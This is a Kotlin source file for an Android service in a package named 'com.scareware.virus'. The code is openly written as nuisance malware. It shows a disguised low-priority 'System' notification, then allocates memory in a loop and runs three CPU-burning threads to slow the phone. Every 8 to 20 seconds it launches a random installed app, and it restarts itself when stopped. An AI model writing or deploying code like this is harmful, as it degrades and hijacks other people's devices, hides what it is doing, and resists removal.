package com.scareware.virus

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.random.Random

class LagService : Service() {

    private val running = AtomicBoolean(true)
    private val handler = Handler(Looper.getMainLooper())
    private val executor = Executors.newCachedThreadPool()
    private val ramChunks = mutableListOf<ByteArray>()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(99, buildSilentNotification())
        startRamAttack()
        startRandomAppOpener()
        return START_STICKY
    }

    private fun buildSilentNotification(): Notification {
        val channelId = "sys_update"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System",
                NotificationManager.IMPORTANCE_MIN
            )
            channel.setShowBadge(false)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }

        val pi = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("System")
            .setContentText("Working...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentIntent(pi)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    /** Allocate large chunks of RAM until the system starts killing other apps / lagging hard */
    private fun startRamAttack() {
        executor.execute {
            try {
                // Keep allocating ~8-12 MB chunks
                while (running.get()) {
                    try {
                        val chunk = ByteArray(8 * 1024 * 1024) // 8 MB
                        // Touch the memory so it is really allocated
                        for (i in chunk.indices step 4096) {
                            chunk[i] = 1
                        }
                        synchronized(ramChunks) {
                            ramChunks.add(chunk)
                            // Soft limit so the process itself is not instantly killed
                            if (ramChunks.size > 40) { // ~320 MB
                                // Drop oldest a bit then continue
                                if (ramChunks.isNotEmpty()) ramChunks.removeAt(0)
                            }
                        }
                    } catch (oom: OutOfMemoryError) {
                        // Hit the limit, wait a bit then try again
                        Thread.sleep(1500)
                    }
                    Thread.sleep(300)
                }
            } catch (_: Exception) {}
        }

        // Extra CPU burn threads
        repeat(3) {
            executor.execute {
                var x = 0L
                while (running.get()) {
                    x = (x * 31 + 17) xor System.nanoTime()
                    if (x % 100000L == 0L) {
                        try { Thread.sleep(1) } catch (_: Exception) {}
                    }
                }
            }
        }
    }

    /** Randomly open other installed apps to annoy / confuse */
    private fun startRandomAppOpener() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (!running.get()) return
                tryOpenRandomApp()
                // Every 8-20 seconds open something
                handler.postDelayed(this, Random.nextLong(8000, 20000))
            }
        }, 6000)
    }

    private fun tryOpenRandomApp() {
        try {
            val pm = packageManager
            val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
                .filter {
                    // Prefer normal user apps, skip ourselves and system-heavy ones
                    (it.flags and ApplicationInfo.FLAG_SYSTEM) == 0 &&
                            it.packageName != packageName
                }

            if (apps.isEmpty()) return

            val target = apps[Random.nextInt(apps.size)]
            val launch = pm.getLaunchIntentForPackage(target.packageName)
            if (launch != null) {
                launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(launch)
            }
        } catch (_: Exception) {}
    }

    override fun onDestroy() {
        running.set(false)
        // Try to restart
        val restart = Intent(this, LagService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restart)
        } else {
            startService(restart)
        }
        super.onDestroy()
    }
}
